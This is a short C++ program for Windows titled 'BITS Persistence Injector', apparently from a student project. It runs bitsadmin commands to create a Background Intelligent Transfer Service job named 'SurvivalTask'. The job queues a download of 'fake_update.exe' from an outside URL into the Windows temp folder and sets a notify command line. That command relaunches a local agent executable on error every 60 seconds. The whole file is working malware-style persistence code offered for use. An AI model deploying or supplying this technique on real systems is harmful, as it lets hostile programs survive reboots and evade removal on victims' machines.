#include <windows.h>
#include <iostream>
#include <string>

// Configuration - Update these paths to match your FYP structure
const std::string JOB_NAME = "SurvivalTask";
const std::string AGENT_PATH = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\agent.exe";
const std::string FAKE_URL = "https://hackingarticles.in/fake_update.exe";
const std::string TEMP_DEST = "C:\\Windows\\Temp\\bits_cache.tmp";

void ExecuteCommand(std::string cmd) {
    std::cout << "[*] Executing: " << cmd << std::endl;
    system(cmd.c_str());
}

int main() {
    std::cout << "--- BITS Persistence Injector ---" << std::endl;

    // 1. Clean up any existing job with the same name to avoid collisions
    ExecuteCommand("bitsadmin /cancel " + JOB_NAME);

    // 2. Create the persistent job
    ExecuteCommand("bitsadmin /create " + JOB_NAME);

    // 3. Add a placeholder file (Required for BITS to transition states)
    ExecuteCommand("bitsadmin /addfile " + JOB_NAME + " \"" + FAKE_URL + "\" \"" + TEMP_DEST + "\"");

    // 4. Set the Command Line to execute your agent
    // The "NUL" at the end is for the optional parameters argument
    ExecuteCommand("bitsadmin /SetNotifyCmdLine " + JOB_NAME + " \"" + AGENT_PATH + "\" NUL");

    // 5. Set Notification Flags to 3 (Notify on Error AND Transferred)
    // This ensures maximum reliability for the trigger
    ExecuteCommand("bitsadmin /SetNotifyFlags " + JOB_NAME + " 3");

    // 6. Set the Retry Delay to 60 seconds (The 'Loop' interval)
    ExecuteCommand("bitsadmin /SetMinRetryDelay " + JOB_NAME + " 60");

    // 7. Resume the job to 'Arm' the persistence
    ExecuteCommand("bitsadmin /resume " + JOB_NAME);

    std::cout << "\n[SUCCESS] BITS persistence 'SurvivalTask' is now armed." << std::endl;
    std::cout << "[INFO] Agent will trigger upon the first 404 error." << std::endl;

    return 0;
}